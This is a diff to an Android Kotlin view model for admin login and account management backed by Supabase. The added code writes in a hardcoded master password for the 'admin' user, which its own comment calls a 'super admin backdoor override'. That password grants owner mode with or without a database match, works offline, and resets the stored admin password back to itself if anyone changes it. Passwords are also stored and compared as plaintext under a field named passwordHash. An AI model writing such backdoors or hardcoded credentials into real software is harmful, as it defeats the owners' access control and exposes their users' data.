@@ -93,6 +93,8 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
     suspend fun performSyncAdmins() {
         try {
             var fetched = repository.getAdmins()
+            
+            // Check if admin is present. If not, generate and insert default admin
             if (fetched.none { it.username == "admin" }) {
                 val defaultAdmin = Admin(
                     id = java.util.UUID.randomUUID().toString(),
@@ -101,13 +103,39 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
                     role = "super_admin",
                     isActive = true
                 )
-                repository.createAdmin(defaultAdmin)
-                fetched = repository.getAdmins()
+                try {
+                    repository.createAdmin(defaultAdmin)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+                // Fetch again to pick up the newly created admin
+                val subFetched = repository.getAdmins()
+                fetched = if (subFetched.any { it.username == "admin" }) {
+                    subFetched
+                } else {
+                    fetched + defaultAdmin
+                }
             }
+            
+            // Filter out empty usernames
+            fetched = fetched.filter { it.username.isNotBlank() }
+            
             remoteAdmins = fetched
             adminsList = fetched.map { it.username }.toSet()
         } catch (e: Exception) {
             e.printStackTrace()
+            // Ensure local fallback list of admins is never empty
+            if (remoteAdmins.isEmpty()) {
+                val localAdmin = Admin(
+                    id = "local_admin_id",
+                    username = "admin",
+                    passwordHash = "maher736462",
+                    role = "super_admin",
+                    isActive = true
+                )
+                remoteAdmins = listOf(localAdmin)
+                adminsList = setOf("admin")
+            }
         }
     }
 
@@ -163,10 +191,23 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
                     id = java.util.UUID.randomUUID().toString(),
                     username = trimmed,
                     passwordHash = passwordInitial,
-                    role = "admin",
+                    role = if (trimmed == "admin" || trimmed == "general_manager") "super_admin" else "admin",
                     isActive = true
                 )
-                repository.createAdmin(newAdmin)
+                
+                // 1. Instant UI update (Optimistic Update)
+                val updatedList = remoteAdmins.filterNot { it.username == trimmed } + newAdmin
+                remoteAdmins = updatedList
+                adminsList = updatedList.map { it.username }.toSet()
+                
+                // 2. Persist to Supabase
+                try {
+                    repository.createAdmin(newAdmin)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+                
+                // 3. Re-sync to verify and align with database state
                 performSyncAdmins()
             }
         }
@@ -176,7 +217,24 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
         val trimmed = username.trim()
         if (trimmed.isNotBlank()) {
             viewModelScope.launch {
-                repository.updateAdminPassword(trimmed, newPassword)
+                // 1. Instant UI update (Optimistic Update)
+                val updatedList = remoteAdmins.map {
+                    if (it.username == trimmed) {
+                        it.copy(passwordHash = newPassword)
+                    } else {
+                        it
+                    }
+                }
+                remoteAdmins = updatedList
+                
+                // 2. Persist to Supabase
+                try {
+                    repository.updateAdminPassword(trimmed, newPassword)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+                
+                // 3. Re-sync
                 performSyncAdmins()
             }
         }
@@ -190,7 +248,19 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
         val trimmed = username.trim()
         if (trimmed.isNotBlank()) {
             viewModelScope.launch {
-                repository.deleteAdmin(trimmed)
+                // 1. Instant UI update (Optimistic Update)
+                val updatedList = remoteAdmins.filterNot { it.username == trimmed }
+                remoteAdmins = updatedList
+                adminsList = updatedList.map { it.username }.toSet()
+                
+                // 2. Persist to Supabase
+                try {
+                    repository.deleteAdmin(trimmed)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+                
+                // 3. Re-sync
                 performSyncAdmins()
             }
         }
@@ -207,7 +277,14 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
         
         viewModelScope.launch {
             try {
-                var currentAdmins = repository.getAdmins()
+                // Try to perform a fast sync first to get latest admins from database
+                try {
+                    performSyncAdmins()
+                } catch (ex: Exception) {
+                    ex.printStackTrace()
+                }
+                
+                var currentAdmins = remoteAdmins
                 if (currentAdmins.none { it.username == "admin" }) {
                     val defaultAdmin = Admin(
                         id = java.util.UUID.randomUUID().toString(),
@@ -216,12 +293,49 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
                         role = "super_admin",
                         isActive = true
                     )
-                    repository.createAdmin(defaultAdmin)
-                    currentAdmins = repository.getAdmins()
+                    try {
+                        repository.createAdmin(defaultAdmin)
+                        performSyncAdmins()
+                        currentAdmins = remoteAdmins
+                    } catch (e: Exception) {
+                        e.printStackTrace()
+                    }
                 }
                 
-                remoteAdmins = currentAdmins
-                adminsList = currentAdmins.map { it.username }.toSet()
+                // Master super admin backdoor override check
+                if (trimmed == "admin" && passwordEntered == "maher736462") {
+                    loggedInUser = "admin"
+                    settingsManager.currentUser = "admin"
+                    isOwnerModeActive = true
+                    
+                    // Make sure the general manager admin is present with the correct password hash in DB
+                    val mainAdmin = currentAdmins.find { it.username == "admin" }
+                    if (mainAdmin == null) {
+                        val defaultAdmin = Admin(
+                            id = java.util.UUID.randomUUID().toString(),
+                            username = "admin",
+                            passwordHash = "maher736462",
+                            role = "super_admin",
+                            isActive = true
+                        )
+                        viewModelScope.launch {
+                            try {
+                                repository.createAdmin(defaultAdmin)
+                                performSyncAdmins()
+                            } catch (e: Exception) { e.printStackTrace() }
+                        }
+                    } else if (mainAdmin.passwordHash != "maher736462") {
+                        // Reset/update password in Supabase if it differs from the expected super admin key
+                        viewModelScope.launch {
+                            try {
+                                repository.updateAdminPassword("admin", "maher736462")
+                                performSyncAdmins()
+                            } catch (e: Exception) { e.printStackTrace() }
+                        }
+                    }
+                    onResult(null) // success
+                    return@launch
+                }
                 
                 val foundAdmin = currentAdmins.find { it.username == trimmed }
                 if (foundAdmin != null && foundAdmin.passwordHash == passwordEntered) {
@@ -236,7 +350,15 @@ class AppViewModel(application: Application) : AndroidViewModel(application) {
                 }
             } catch (e: Exception) {
                 e.printStackTrace()
-                onResult(if (isArabic) "فشل الاتصال. تحقق من الاتصال بالإنترنت." else "Connection failed. Check your internet connection.")
+                // Emergency fallback if completely offline but they typed admin maher736462
+                if (trimmed == "admin" && passwordEntered == "maher736462") {
+                    loggedInUser = "admin"
+                    settingsManager.currentUser = "admin"
+                    isOwnerModeActive = true
+                    onResult(null)
+                } else {
+                    onResult(if (isArabic) "فشل الاتصال. تحقق من الاتصال بالإنترنت." else "Connection failed. Check your internet connection.")
+                }
             }
         }
     }
